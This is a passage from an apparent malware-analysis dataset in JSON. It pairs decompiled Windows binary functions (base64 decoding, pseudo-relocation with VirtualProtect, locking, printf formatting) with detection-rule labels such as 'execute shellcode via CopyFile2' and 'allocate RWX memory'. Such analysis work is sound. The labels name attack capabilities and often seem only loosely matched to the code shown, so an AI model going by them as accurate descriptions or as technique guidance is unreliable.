*(pcVar5 + arg1_03 + 0x11) = uVar1 << 4 | uVar3 >> 2;\n                        arg1_03 = arg1_03 + 2;\n                        goto code_r0x000140007516;\n                    }\n                }\n            }\n        }\n        else {\n            do {\n                arg1_02 = iVar12;\n                uVar1 = *(arg1 + arg1_02 + 0x10);\n                iVar12 = arg1_02 + 1;\n                if (0x20 < uVar1) break;\n            } while ((arg1_05 >> (uVar1 & 0x3f) & 1) != 0);\n            uVar13 = pcVar10[uVar1];\n            if (pcVar10[uVar1] == 0xff) goto code_r0x000140007457;\n            uVar6 = pcVar10[*(arg1 + arg1_02 + 0x11)];\n            if (uVar6 != 0xff) {\n                iVar12 = arg1_02 + 2;\n                unaff_RBP = pcVar10[*(arg1 + arg1_02 + 0x12)];\n                if (unaff_RBP != 0xff) goto code_r0x000140007382;\n            }\n        }\n        do {\n            arg1_05 = fcn.140006146(0x1400dd5e0, 0x30);\n            *arg1_05 = 0x1400dd5a0;\n            arg1_05[2] = \"ValueError\";\n            arg2 = fcn.140006561(*(arg1 + iVar12 + 0x10));\n            arg2_00 = fcn.140006561(iVar12);\n            iVar12 = 0;\n            if (arg2 != NULL) {\n                iVar12 = *arg2;\n            }\n            iVar7 = 0;\n            if (arg2_00 != NULL) {\n                iVar7 = *arg2_00;\n            }\n            arg1_01 = fcn.14000637b(iVar12 + 0x38 + iVar7);\n            fcn.140001f14(arg1_01, 0x1400d6240);\ncode_r0x0001400072fb:\n            arg1_04 = arg1_01;\n            fcn.1400017f7(arg1_01);\n            fcn.140001f14(arg1_01, 0x1400d6220);\n            fcn.140001f3a(arg1_04, arg2);\n            fcn.140001f14(arg1_04, 0x1400d6200);\n            fcn.140001f3a(arg1_04, arg2_00);\n            fcn.140001f14(arg1_04, 0x1400d61e0);\n            fcn.140004e55(arg1_05 + 3, arg1_04);\n            fcn.140004e55(arg1_05 + 1, 0);\n            pcVar5 = \"base64.nim\";\n            arg1_03 = \"decode\";\n            pcVar10 = \"ValueError\";\n            puVar9 = arg1_05;\n            uVar6 = fcn.140006a95(arg1_05, \"ValueError\");\n            uVar13 = puVar9;\ncode_r0x000140007382:\n            iVar12 = arg1_02 + 3;\n            uVar1 = pcVar10[*(arg1 + arg1_02 + 0x13)];\n        } while (uVar1 == 0xff);\n        arg1_02 = arg1_02 + 4;\n        *(pcVar5 + arg1_03 + 0x10) = uVar13 << 2 | uVar6 >> 4;\n        iVar12 = unaff_RBP >> 2;\n        uVar13 = unaff_RBP << 6 | uVar1;\n        unaff_RBP = uVar13;\n        *(pcVar5 + arg1_03 + 0x12) = uVar13;\n        *(pcVar5 + arg1_03 + 0x11) = uVar6 << 4 | iVar12;\n        arg1_03 = arg1_03 + 3;\n    } while( true );\n}\n",
        "token_count": 2456
    },
    "14000a23": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.14000a230(uint64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t iVar8;\n    uint32_t *puVar9;\n    code *pcVar10;\n    uint32_t uVar11;\n    uint64_t *puVar12;\n    uint *puVar13;\n    int64_t iVar14;\n    int64_t *piVar15;\n    int32_t *piVar16;\n    int32_t iVar17;\n    uint uVar18;\n    char *arg1_00;\n    uint64_t arg2;\n    uint32_t *puVar19;\n    int64_t iVar20;\n    int64_t *arg1_01;\n    uint64_t in_R8;\n    int64_t in_R9;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    ulong auStack320 [5];\n    uint auStack280 [2];\n    uint64_t auStack272 [10];\n    uchar auStack192 [8];\n    ulong uStack184;\n    int64_t iStack168;\n    int64_t iStack160;\n    ulong auStack72 [3];\n    ulong uStack48;\n    int32_t iStack36;\n    \n    iStack168 = *0x1400edf74;\n    if (*0x1400edf74 < 1) goto code_r0x00014000a360;\n    iVar17 = 0;\n    puVar12 = *0x1400edf78 + 0x18;\n    do {\n        if ((*puVar12 <= arg1) && (in_R8 = *(puVar12[1] + 8),  arg1 < *puVar12 + in_R8)) {\n            return;\n        }\n        iVar17 = iVar17 + 1;\n        puVar12 = puVar12 + 5;\n    } while (iVar17 != *0x1400edf74);\n    while (iStack160 = fcn.14000abd0(arg1),  iStack160 != 0) {\n        iStack168 = iStack168 * 0x28;\n        puVar13 = *0x1400edf78 + iStack168;\n        *(puVar13 + 8) = iStack160;\n        *puVar13 = 0;\n        iVar14 = fcn.14000ad00();\n        iVar14 = *(iStack160 + 0xc) + iVar14;\n        *(*0x1400edf78 + iStack168 + 0x18) = iVar14;\n        iVar14 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar14, auStack72, 0x30);\n        if (iVar14 == 0) {\n            in_R8 = *(*0x1400edf78 + iStack168 + 0x18);\n            fcn.14000a1c0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack160 + 8), in_R8, in_R9);\n            break;\n        }\n        if (((iStack36 - 0x40U & 0xffffffbf) == 0) || ((iStack36 - 4U & 0xfffffffb) == 0)) {\ncode_r0x00014000a2fc:\n            *0x1400edf74 = *0x1400edf74 + 1;\n            return;\n        }\n        in_R8 = 4;\n        if (iStack36 != 2) {\n            in_R8 = 0x40;\n        }\n        in_R9 = *0x1400edf78 + iStack168;\n        *(in_R9 + 8) = auStack72[0];\n        *(in_R9 + 0x10) = uStack48;\n        iVar17 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar17 != 0) goto code_r0x00014000a2fc;\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.14000a1c0(\"  VirtualProtect failed with code 0x%x\", uVar11, in_R8, in_R9);\ncode_r0x00014000a360:\n        iStack168 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.14000a1c0(\"Address %p has no image-section\", arg1, in_R8, in_R9);\n    iVar17 = *0x1400edf70;\n    if (*0x1400edf70 != 0) {\n        return;\n    }\n    *0x1400edf70 = 1;\n    auStack272[5] = 0x14000a3df;\n    fcn.14000ac50();\n    auStack272[5] = 0x14000a3f6;\n    iVar14 = fcn.14000ae90(arg1_00);\n    iVar20 = *0x1400d7060;\n    puVar9 = *0x1400d7030;\n    *0x1400edf74 = 0;\n    iVar14 = -iVar14;\n    *0x1400edf78 = auStack192 + iVar14;\n    if (*0x1400d7030 - *0x1400d7040 < 8) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    puVar19 = *0x1400d7040;\n    if (*0x1400d7030 - *0x1400d7040 < 0xc) {\ncode_r0x00014000a433:\n        if (*puVar19 == 0) {\n            uVar11 = puVar19[1];\ncode_r0x00014000a440:\n            if (uVar11 == 0) {\n                arg2 = puVar19[2];\n                if (puVar19[2] != 1) {\ncode_r0x00014000a611:\n                    uVar18 = 0x400d69a0;\n                    *(auStack272 + iVar14 + 0x28) = 0x14000a61d;\n                    fcn.14000a1c0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2, in_R8, in_R9);\n                    if (*0x1400edf80 != NULL) {\n                        uVar6 = *(&uStack184 + iVar14);\n                        *(auStack280 + iVar14) = uVar18;\n                        *(auStack272 + iVar14) = arg2;\n                        *(auStack272 + iVar14 + 8) = in_XMM2_Qa;\n                        *(auStack272 + iVar14 + 0x10) = in_XMM3_Qa;\n                        *(auStack272 + iVar14 + 0x18) = uVar6;\n                        *(auStack320 + iVar14) = 0x14000a65b;\n                        (**0x1400edf80)(auStack280 + iVar14);\n                    }\n                    return;\n                }\n                puVar19 = puVar19 + 3;\n                if (*0x1400d7030 <= puVar19) {\n                    *0x1400edf74 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar19 + 2);\n                        arg2 = uVar2;\n                        piVar15 = *puVar19 + iVar20;\n                        arg1_01 = puVar19[1] + iVar20;\n                        iVar5 = *piVar15;\n                        if (uVar2 != 0x20) break;\n                        iVar4 = *arg1_01;\n                        *(auStack272 + iVar14 + 0x28) = 0x14000a5c4;\n                        fcn.14000a230(arg1_01);\n                        *arg1_01 = iVar5 + (iVar4 - piVar15);\ncode_r0x00014000a49c:\n                        puVar19 = puVar19 + 3;\n                        if (puVar9 <= puVar19) goto code_r0x00014000a508;\n                    }\n                    if (0x20 < uVar2) {\n                        if (uVar2 == 0x40) {\n                            iVar8 = *arg1_01;\n                            *(auStack272 + iVar14 + 0x28) = 0x14000a59a;\n                            fcn.14000a230(arg1_01);\n                            *arg1_01 = iVar5 + (iVar8 - piVar15);\n                            goto code_r0x00014000a49c;\n                        }\ncode_r0x00014000a605:\n                        *(auStack272 + iVar14 + 0x28) = 0x14000a611;\n                        fcn.14000a1c0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2, in_R8, in_R9);\n                        goto code_r0x00014000a611;\n                    }\n                    if (uVar2 == 8) {\n                        uVar2 = *arg1_01;\n                        in_R8 = uVar2 | 0xffffffffffffff00;\n                        *(auStack272 + iVar14 + 0x28) = 0x14000a499;\n                        fcn.14000a230(arg1_01);\n                        *arg1_01 = iVar5 + (uVar2 - piVar15);\n                        goto code_r0x00014000a49c;\n                    }\n                    if (uVar2 != 0x10) goto code_r0x00014000a605;\n                    uVar3 = *arg1_01;\n                    in_R8 = uVar3 | 0xffffffffffff0000;\n                    puVar19 = puVar19 + 3;\n                    *(auStack272 + iVar14 + 0x28) = 0x14000a4fa;\n                    fcn.14000a230(arg1_01);\n                    *arg1_01 = iVar5 + (uVar3 - piVar15);\n                } while (puVar19 < puVar9);\n                goto code_r0x00014000a508;\n            }\n        }\n    }\n    else if (**0x1400d7040 == 0) {\n        uVar11 = (*0x1400d7040)[1];\n        if ((uVar11 | (*0x1400d7040)[2]) == 0) {\n            puVar19 = *0x1400d7040 + 3;\n            goto code_r0x00014000a433;\n        }\n        goto code_r0x00014000a440;\n    }\n    if (*0x1400d7030 <= puVar19) {\n        *0x1400edf74 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar19 + 1;\n        uVar11 = *puVar19;\n        puVar19 = puVar19 + 2;\n        piVar16 = *puVar1 + iVar20;\n        iVar4 = *piVar16;\n        *(auStack272 + iVar14 + 0x28) = 0x14000a5f8;\n        fcn.14000a230(piVar16);\n        *piVar16 = uVar11 + iVar4;\n    } while (puVar19 < puVar9);\ncode_r0x00014000a508:\n    pcVar10 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x1400edf74) {\n        iVar20 = 0;\n        do {\n            piVar16 = *0x1400edf78 + iVar20;\n            iVar4 = *piVar16;\n            if (iVar4 != 0) {\n                uVar6 = *(piVar16 + 4);\n                uVar7 = *(piVar16 + 2);\n                *(auStack272 + iVar14 + 0x28) = 0x14000a547;\n                (*pcVar10)(uVar7, uVar6, iVar4, &uStack184 + 4);\n            }\n            iVar17 = iVar17 + 1;\n            iVar20 = iVar20 + 0x28;\n        } while (iVar17 < *0x1400edf74);\n    }\n    return;\n}\n",
        "token_count": 2722
    },
    "140011d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nbool fcn.140011d40(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg2;\n    bool bVar3;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.1400119a0(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    if (arg2[1] != 0) {\n        if (*arg2 == 0) {\n            return 0x16;\n        }\n        iVar2 = arg2[5];\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != iVar1) {\n            return true;\n        }\n        if (arg2[4] != 0) {\n            arg2[4] = arg2[4] + -1;\n            return false;\n        }\n        arg2[5] = -1;\n    }\n    iVar2 = *arg2;\n    *arg2 = 0;\n    bVar3 = false;\n    if (iVar2 == 2) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2 + 2));\n        bVar3 = iVar2 == 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 300
    },
    "140011e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.140011e00(int32_t **arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg2;\n    ulong uVar3;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.1400119a0(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    LOCK();\n    if (*arg2 == 0) {\n        *arg2 = 1;\n        uVar3 = 0;\n        if (arg2[1] != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            arg2[5] = iVar1;\n            return 0;\n        }\n    }\n    else if ((arg2[1] == 2) &&\n            (iVar1 = arg2[5],  iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar1 == iVar2)) {\n        arg2[4] = arg2[4] + 1;\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x10;\n    }\n    return uVar3;\n}\n",
        "token_count": 279
    },
    "1400168d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.1400168d0(ulong arg1, int64_t arg2, ulong arg3, char *arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    float10 *pfVar9;\n    uint8_t *puVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    int32_t *piVar13;\n    char16_t *arg1_00;\n    int32_t iVar14;\n    float10 **in_stack_00000028;\n    float10 afStack168 [3];\n    ushort uStack138;\n    float10 *pfStack136;\n    int64_t iStack128;\n    int64_t iStack120;\n    uint32_t uStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    ushort uStack96;\n    int32_t iStack92;\n    ushort uStack88;\n    uint32_t uStack84;\n    int32_t iStack80;\n    uint uStack76;\n    \n    puVar4 = sub.msvcrt.dll__errno();\n    uVar7 = *arg4;\n    arg1._0_4_ = arg1 & 0x6000;\n    uVar1 = *puVar4;\n    uStack88 = 0;\n    iStack80 = arg3;\n    puVar10 = arg4 + 1;\n    iStack104 = -1;\n    uStack100 = 0xfffffffd;\n    iStack108 = -1;\n    uStack96 = 0;\n    iStack92 = 0;\n    uStack84 = 0;\n    uStack76 = 0xffffffff;\n    iStack120 = arg2;\n    uStack112 = arg1;\n    uVar8 = uVar7;\n    if (*arg4 == '\\0') {\n        return uVar7;\n    }\ncode_r0x0001400169df:\n    if (uVar8 == 0x25) {\n        uVar3 = *puVar10;\n        iStack108 = -1;\n        iStack104 = -1;\n        if (uVar3 == 0) {\n            return uStack84;\n        }\n        piVar13 = &iStack108;\n        iVar14 = 0;\n        uVar8 = 0;\n        puVar11 = puVar10;\n        uStack112 = arg1;\n        do {\n            puVar12 = puVar11 + 1;\n            uVar7 = uVar3;\n    // switch table (91 cases) at 0x1400d6ca0\n            switch(uVar3) {\n            case 0x20:\n                if (uVar8 != 0) goto code_r0x000140016e40;\n                uVar3 = puVar11[1];\n                uStack112 = uStack112 | 0x40;\n                break;\n            default:\n                if ((uVar3 - 0x30 < 10) && (uVar8 < 4)) {\n                    if (uVar8 == 0) {\n                        uVar8 = 1;\n                    }\n                    else {\ncode_r0x0001400170d0:\n                        if (uVar8 == 2) {\n                            uVar8 = 3;\n                        }\n                    }\n                    if (piVar13 != NULL) {\n                        if (-1 < *piVar13) {\n                            *piVar13 = (uVar7 - 0x30) + *piVar13 * 10;\n                            uVar3 = puVar11[1];\n                            break;\n                        }\n                        *piVar13 = uVar7 - 0x30;\n                    }\n                    goto code_r0x000140016e40;\n                }\ncode_r0x0001400170fc:\n                fcn.140014dc0(0x25, &iStack120);\n                puVar12 = puVar10;\n                goto code_r0x0001400169cd;\n            case 0x23:\n                if (uVar8 != 0) goto code_r0x000140016e40;\n                uVar3 = puVar11[1];\n                uStack112 = uStack112 | 0x800;\n                break;\n            case 0x25:\n                goto code_r0x000140016f64;\n            case 0x27:\n                if (uVar8 != 0) goto code_r0x000140016e40;\n                uStack112 = uStack112 | 0x1000;\n                pfStack136 = pfStack136 & 0xffffffff00000000;\n                iVar5 = sub.msvcrt.dll_localeconv();\n                iStack92 = fcn.140019d80(&uStack138, *(iVar5 + 8), 0x10, &pfStack136);\n                if (0 < iStack92) {\n                    uStack88 = uStack138;\n                }\n                uVar3 = puVar11[1];\n                break;\n            case 0x2a:\n                if (piVar13 == NULL) {\ncode_r0x000140016e1a:\n                    uVar3 = puVar11[1];\n                    uVar8 = 4;\n                }\n                else if ((uVar8 & 0xfffffffd) == 0) {\n                    iVar2 = *in_stack_00000028;\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                    *piVar13 = iVar2;\n                    if (iVar2 < 0) {\n                        if (uVar8 == 0) {\n                            uVar3 = puVar11[1];\n                            iStack108 = -iStack108;\n                            uStack112 = uStack112 | 0x400;\n                            piVar13 = NULL;\n                            break;\n                        }\n                        iStack104 = -1;\n                    }\n                    uVar3 = puVar11[1];\n                    piVar13 = NULL;\n                }\n                else {\n                    uVar3 = puVar11[1];\n                    piVar13 = NULL;\n                    uVar8 = 4;\n                }\n                break;\n            case 0x2b:\n                if (uVar8 == 0) {\n                    uStack112 = uStack112 | 0x100;\n                }\n                goto code_r0x000140016e40;\n            case 0x2d:\n                if (uVar8 != 0) goto code_r0x000140016e40;\n                uVar3 = puVar11[1];\n                uStack112 = uStack112 | 0x400;\n                break;\n            case 0x2e:\n                if (1 < uVar8) goto code_r0x000140016e1a;\n                uVar3 = puVar11[1];\n                uVar8 = 2;\n                iStack104 = 0;\n                piVar13 = &iStack104;\n                break;\n            case 0x30:\n                if (uVar8 != 0) {\n                    if (uVar8 < 4) {\n                        uVar7 = 0x30;\n                        goto code_r0x0001400170d0;\n                    }\n                    goto code_r0x0001400170fc;\n                }\n                uStack112 = uStack112 | 0x200;\ncode_r0x000140016e40:\n                uVar3 = puVar11[1];\n                break;\n            case 0x41:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140016c55;\ncode_r0x000140016e60:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                afStack168[0] = pfVar9;\n                fcn.140016390(afStack168, &iStack120);\n                goto code_r0x0001400169cd;\n            case 0x43:\n                goto code_r0x000140016e94;\n            case 0x45:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140016cf5;\ncode_r0x000140016ed0:\n                afStack168[0] = pfVar9;\n                fcn.140016080(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x46:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140016d8b;\ncode_r0x000140016f08:\n                afStack168[0] = pfVar9;\n                fcn.140016130(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x47:\n                pfVar9 = *in_stack_00000028;\n                if ((uStack112 & 4) != 0) goto code_r0x000140016dc3;\ncode_r0x000140016f40:\n                afStack168[0] = pfVar9;\n                fcn.140016220(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x49:\n                uVar3 = puVar11[1];\n                if (uVar3 == 0x36) {\n                    if (puVar11[2] != 0x34) goto code_r0x0001400170fc;\n                    uVar3 = puVar11[3];\n                    iVar14 = 3;\n                    puVar12 = puVar11 + 3;\n                    uVar8 = 4;\n                }\n                else if (uVar3 == 0x33) {\n                    if (puVar11[2] != 0x32) goto code_r0x0001400170fc;\n                    uVar3 = puVar11[3];\n                    iVar14 = 2;\n                    puVar12 = puVar11 + 3;\n                    uVar8 = 4;\n                }\n                else {\n                    iVar14 = 3;\n                    uVar8 = 4;\n                }\n                break;\n            case 0x4c:\n                uVar3 = puVar11[1];\n                uStack112 = uStack112 | 4;\n                uVar8 = 4;\n                break;\n            case 0x53:\n                goto code_r0x00014001707e;\n            case 0x58:\n            case 0x6f:\n            case 0x75:\n            case 0x78:\n                if (iVar14 == 3) {\n                    pfStack136 = *in_stack_00000028;\n                }\n                else {\n                    uVar8 = *in_stack_00000028;\n                    pfStack136 = uVar8;\n                    if (iVar14 != 2) {\n                        if (iVar14 == 1) {\n                            pfStack136 = uVar8;\n                        }\n                        else if (iVar14 == 5) {\n                            pfStack136 = uVar8;\n                        }\n                    }\n                }\n                if (uVar7 == 0x75) {\n                    fcn.1400156f0(pfStack136, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    fcn.1400151b0(uVar7, pfStack136, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x0001400169cd;\n            case 0x61:\n                pfVar9 = *in_stack_00000028;\n                uVar7 = uStack112 | 0x20;\n                uVar8 = uStack112 & 4;\n                uStack112 = uVar7;\n                if (uVar8 == 0) goto code_r0x000140016e60;\ncode_r0x000140016c55:\n                in_stack_00000028 = in_stack_00000028 + 1;\n                afStack168[0] = *pfVar9;\n                fcn.140016390(afStack168, &iStack120);\n                goto code_r0x0001400169cd;\n            case 99:\n                iStack104 = -1;\n                if (iVar14 - 2U < 2) {\ncode_r0x000140016e94:\n                    iStack104 = -1;\n                    pfStack136 = pfStack136 & 0xffffffffffff0000 | *in_stack_00000028;\n                    fcn.140014e20(&pfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    pfStack136 = pfStack136 & 0xffffffffffffff00 | *in_stack_00000028;\n                    fcn.140014f80(&pfStack136, 1, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x0001400169cd;\n            case 100:\n            case 0x69:\n                uStack112 = uStack112 | 0x80;\n                if (iVar14 == 3) {\n                    pfStack136 = *in_stack_00000028;\n                }\n                else {\n                    iVar2 = *in_stack_00000028;\n                    pfStack136 = iVar2;\n                    if (iVar14 != 2) {\n                        if (iVar14 == 1) {\n                            pfStack136 = iVar2;\n                        }\n                        else if (iVar14 == 5) {\n                            pfStack136 = iVar2;\n                        }\n                    }\n                }\n                iStack128 = pfStack136 >> 0x3f;\n                fcn.1400156f0(pfStack136, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x65:\n                pfVar9 = *in_stack_00000028;\n                uVar7 = uStack112 | 0x20;\n                uVar8 = uStack112 & 4;\n                uStack112 = uVar7;\n                if (uVar8 == 0) goto code_r0x000140016ed0;\ncode_r0x000140016cf5:\n                afStack168[0] = *pfVar9;\n                fcn.140016080(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x66:\n                pfVar9 = *in_stack_00000028;\n                uVar7 = uStack112 | 0x20;\n                uVar8 = uStack112 & 4;\n                uStack112 = uVar7;\n                if (uVar8 == 0) goto code_r0x000140016f08;\ncode_r0x000140016d8b:\n                afStack168[0] = *pfVar9;\n                fcn.140016130(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x67:\n                pfVar9 = *in_stack_00000028;\n                uVar7 = uStack112 | 0x20;\n                uVar8 = uStack112 & 4;\n                uStack112 = uVar7;\n                if (uVar8 == 0) goto code_r0x000140016f40;\ncode_r0x000140016dc3:\n                afStack168[0] = *pfVar9;\n                fcn.140016220(afStack168, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x68:\n                uVar3 = puVar11[1];\n                if (uVar3 == 0x68) {\n                    uVar3 = puVar11[2];\n                    iVar14 = 5;\n                    puVar12 = puVar11 + 2;\n                    uVar8 = 4;\n                }\n                else {\n                    iVar14 = 1;\n                    uVar8 = 4;\n                }\n                break;\n            case 0x6a:\n            case 0x74:\n            case 0x7a:\n                uVar3 = puVar11[1];\n                iVar14 = 3;\n                uVar8 = 4;\n                break;\n            case 0x6c:\n                uVar3 = puVar11[1];\n                if (uVar3 == 0x6c) {\n                    uVar3 = puVar11[2];\n                    iVar14 = 3;\n                    puVar12 = puVar11 + 2;\n                    uVar8 = 4;\n                }\n                else {\n                    iVar14 = 2;\n                    uVar8 = 4;\n                }\n                break;\n            case 0x6d:\n                uVar6 = sub.msvcrt.dll_strerror(uVar1);\n                fcn.1400150b0(uVar6, &iStack120);\n                goto code_r0x0001400169cd;\n            case 0x6e:\n                pfVar9 = *in_stack_00000028;\n                in_stack_00000028 = in_stack_00000028 + 1;\n                if (iVar14 == 5) {\n                    *pfVar9 = uStack84;\n                }\n                else if (iVar14 == 1) {\n                    *pfVar9 = uStack84;\n                }\n                else if ((iVar14 == 2) || (iVar14 != 3)) {\n                    *pfVar9 = uStack84;\n                }\n                else {\n                    *pfVar9 = uStack84;\n                }\n                goto code_r0x0001400169cd;\n            case 0x70:\n                if ((uVar8 == 0) && (uStack112 == arg1)) {\n                    iStack104 = 0x10;\n                    uStack112 = arg1 | 0x200;\n                }\n                pfStack136 = *in_stack_00000028;\n                iStack128 = 0;\n                fcn.1400151b0(0x78, pfStack136, &iStack120);\n                in_stack_00000028 = in_stack_00000028 + 1;\n                goto code_r0x0001400169cd;\n            case 0x73:\n                if (iVar14 - 2U < 2) {\ncode_r0x00014001707e:\n                    arg1_00 = *in_stack_00000028;\n                    if (arg1_00 == NULL) {\n                        arg1_00 = L\"(null)\";\n                    }\n                    if (iStack104 < 0) {\n                        uVar6 = sub.msvcrt.dll_wcslen(arg1_00);\n                    }\n                    else {\n                        uVar6 = fcn.140019a70(arg1_00, iStack104);\n                    }\n                    fcn.140014e20(arg1_00, uVar6, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                else {\n                    fcn.1400150b0(*in_stack_00000028, &iStack120);\n                    in_stack_00000028 = in_stack_00000028 + 1;\n                }\n                goto code_r0x0001400169cd;\n            }\n            puVar11 = puVar12;\n            if (uVar3 == 0) {\n                return uStack84;\n            }\n        } while( true );\n    }\n    if (((uStack112 & 0x4000) != 0) || (uStack84 < iStack80)) {\n        if ((uStack112 & 0x2000) == 0) {\n            *(iStack120 + uStack84) = uVar7;\n        }\n        else {\n            sub.msvcrt.dll_fputc();\n        }\n    }\n    uStack84 = uStack84 + 1;\n    puVar12 = puVar10;\n    goto code_r0x0001400169cd;\ncode_r0x000140016f64:\n    fcn.140014dc0(0x25, &iStack120);\ncode_r0x0001400169cd:\n    uVar3 = *puVar12;\n    uVar7 = uVar3;\n    puVar10 = puVar12 + 1;\n    uVar8 = uVar3;\n    if (uVar3 == 0) {\n        return uStack84;\n    }\n    goto code_r0x0001400169df;\n}\n",
        "token_count": 4624
    },
    "140018f7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
